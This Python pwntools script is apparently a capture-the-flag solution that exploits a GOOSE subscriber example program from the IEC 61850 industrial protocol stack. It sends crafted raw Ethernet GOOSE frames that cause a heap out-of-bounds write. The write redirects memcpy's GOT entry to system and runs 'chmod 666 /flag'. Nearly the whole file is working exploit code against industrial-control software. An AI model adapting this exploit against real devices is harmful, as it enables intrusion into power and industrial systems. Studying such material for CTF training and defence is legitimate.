#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import time

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './goose_subscriber_example'
context.terminal = ['tmux', 'new-window']
argv = ["lo"]
env = {}
#libc = ELF('./libc-2.29.so')
elf = ELF(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def build_pkt(payload):
    buf = b'\x01\x0c\xcd\x01\x00\x01' #dstmac
    buf += p8(0x41)*6 #srcmac
    buf += p8(0x88)
    buf += p8(0xb8)
    buf += p16(1000, endian='big')
    buf += p16(len(payload)+0x8, endian='big') #len
    buf += p8(0)*4 # reserved field
    buf += payload

    return buf

gocbref = b"simpleIOGenericIO/LLN0$GO$gcbAnalogValues"

def el(l):
    buf = p8(0x4 | 0x80)
    buf += p32(l, endian='big')
    return buf

def build_all_data(padding, payload, payload2=None):
    buf = p8(0x84) # bit string
    buf += el(len(payload)+1)
    buf += p8(padding)
    buf += payload

    buf += p8(0x84) # bit string
    buf += el(0x10+1)
    buf += p8(0x0)
    if payload2:
        buf += payload2
    else:
        buf += b"B"*0x10

    return buf

def build_goose(len_data):
    buf = p8(0x80) #gocbref
    buf += el(len(gocbref))
    buf += gocbref
    buf += p8(0xab) # all data
    buf += el(len_data)
    buf = el(len(buf)) + buf
    return buf

def combine_pkt(goose, data):
    buf = p8(0x61)
    buf += goose
    buf += data
    return buf

def print_pkt(pkt):
    buf = "uint8_t buf[] = {"
    for b in pkt:
        buf += f"{hex(b)}, "

    buf += "}"
    print(buf)
    print("")

def send_pkt(pkt):
    print("Sending: ", len(pkt))
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind(('lo', 0))

    print_pkt(pkt)

    s.send(pkt)

def get_overflow(sz):
    return (sz*8 + 248) // 8

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
break *0x406baf
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

# initial allocation of dataSetValues
# parseAllDataUnknownValue
payload = b"A"*0x18
all_data = build_all_data(0x0,payload)
goose = build_goose(len(all_data))
pkt = combine_pkt(goose, all_data)
pkt = build_pkt(pkt)
send_pkt(pkt)

# edit exists dataSetValues
# trigger oob write to overwrite adjacent MmsValue struct
payload = b"chmod 666 /flag"
payload = payload.ljust(0x18, b'\x00')
# 0x20 chunk PREV_INUSE | IS_MAPPED
payload += p64(0x25)
# 3 = type (bitstring), 0x80 = bit size
payload += p64(0x0000800000000003)
payload += p8(0x0)*5
# overwrite bitstring buf pointer with GOT of memcpy
payload += p64(elf.got['memcpy'])

payload = payload.ljust(get_overflow(0x18), b'\x00')

print("elementLength: ", get_overflow(0x18))

# overwrite memcpy got entry with system PLT stub
payload2 = p64(0x4010e0) + p64(0x4011f0)

#payload = b"A"*get_overflow(0x18)
all_data = build_all_data(248,payload, payload2)
goose = build_goose(len(all_data))
pkt = combine_pkt(goose, all_data)
pkt = build_pkt(pkt)
send_pkt(pkt)

io.interactive()

